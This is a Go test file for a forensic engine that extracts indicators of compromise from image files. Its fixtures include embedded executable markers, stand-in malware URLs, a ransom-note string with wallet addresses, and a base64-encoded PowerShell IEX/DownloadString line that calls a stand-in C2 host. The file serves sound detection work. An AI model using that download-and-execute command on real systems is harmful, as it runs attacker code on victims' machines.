package media

// Regression tests for the IOC (indicator-of-compromise) extraction engine.

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestExtractIOCs_EmbeddedExecutable(t *testing.T) {
	data := []byte{0xFF, 0xD8, 0xFF, 0xE0} // JPEG-ish header
	data = append(data, make([]byte, 200)...)
	data = append(data, 0x7F, 'E', 'L', 'F') // embedded ELF magic
	data = append(data, make([]byte, 64)...)
	data = append(data, []byte("This program cannot be run in DOS mode")...) // PE stub

	iocs := ExtractIOCs(data, nil)
	execs := 0
	for _, i := range iocs {
		if i.Type == IOCTypeEmbeddedExec {
			execs++
		}
	}
	if execs < 2 {
		t.Fatalf("expected >=2 embedded-executable IOCs (ELF+PE), got %d (all: %+v)", execs, iocs)
	}
}

func TestExtractIOCs_NetworkIndicators(t *testing.T) {
	blob := "prefix\x00\x00http://malware.example.com/beacon.bin\x00\x00" +
		"192.168.66.77\x00\x00expyuzz4wqqyqhjn.onion\x00"
	iocs := ExtractIOCs([]byte(blob), nil)

	types := map[IOCType]bool{}
	for _, i := range iocs {
		types[i.Type] = true
	}
	if !types[IOCTypeURL] {
		t.Error("expected a URL IOC")
	}
	if !types[IOCTypeIPv4] {
		t.Error("expected an IPv4 IOC")
	}
	if !types[IOCTypeOnion] {
		t.Error("expected an onion-address IOC")
	}
}

func TestExtractIOCs_Base64Obfuscated(t *testing.T) {
	inner := "powershell -nop -w hidden -enc BLAH; IEX (New-Object Net.WebClient)" +
		".DownloadString('http://c2.example.net/a')"
	b64 := base64.StdEncoding.EncodeToString([]byte(inner))

	data := append([]byte("GIF89a"), make([]byte, 32)...)
	data = append(data, []byte(b64)...)

	iocs := ExtractIOCs(data, nil)
	fromB64 := false
	for _, i := range iocs {
		if i.Source == "base64-decoded" {
			fromB64 = true
		}
	}
	if !fromB64 {
		t.Fatalf("expected at least one IOC decoded out of a base64 blob, got: %+v", iocs)
	}
}

func TestExtractIOCs_CryptoWallet(t *testing.T) {
	data := []byte("ransom note: pay 1BoatSLRHtKNngkdXEeobR76b53LETtpyT or " +
		"0x52908400098527886E0F7030069857D2E4169EE7 now")
	iocs := ExtractIOCs(data, nil)
	wallets := 0
	for _, i := range iocs {
		if i.Type == IOCTypeCryptoWallet {
			wallets++
		}
	}
	if wallets < 1 {
		t.Fatalf("expected at least one crypto-wallet IOC, got %+v", iocs)
	}
}

func TestAnalyze_IOCsRaiseScoreAndReport(t *testing.T) {
	engine := NewForensicEngine()

	pngSig := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}
	clean := append([]byte{}, pngSig...)
	clean = append(clean, buildPNGChunk("IHDR", make([]byte, 13))...)
	clean = append(clean, buildPNGChunk("IEND", nil)...)

	dirty := append([]byte{}, clean...)
	dirty = append(dirty, []byte("This program cannot be run in DOS mode")...)
	dirty = append(dirty, []byte(" http://evil.example.com/x.exe ")...)

	cleanRes := engine.Analyze(clean, "clean.png", "clean.png")
	dirtyRes := engine.Analyze(dirty, "dirty.png", "dirty.png")

	if len(dirtyRes.IOCs) == 0 {
		t.Fatal("expected IOCs to be extracted from the dirty file")
	}
	if dirtyRes.RiskScore < cleanRes.RiskScore {
		t.Errorf("IOC folding must never lower the score: clean=%f dirty=%f",
			cleanRes.RiskScore, dirtyRes.RiskScore)
	}

	report := GenerateReport(dirtyRes, nil)
	if report.RiskBreakdown.IOCRisk <= 0 {
		t.Error("report breakdown should carry a positive IOC risk")
	}
	if report.RiskBreakdown.TotalScore != dirtyRes.RiskScore {
		t.Errorf("breakdown total (%f) must match RiskScore (%f)",
			report.RiskBreakdown.TotalScore, dirtyRes.RiskScore)
	}

	text := GenerateTextReport(dirtyRes, nil)
	if !strings.Contains(text, "Indicators of Compromise") {
		t.Error("text report should include an Indicators of Compromise section")
	}
}
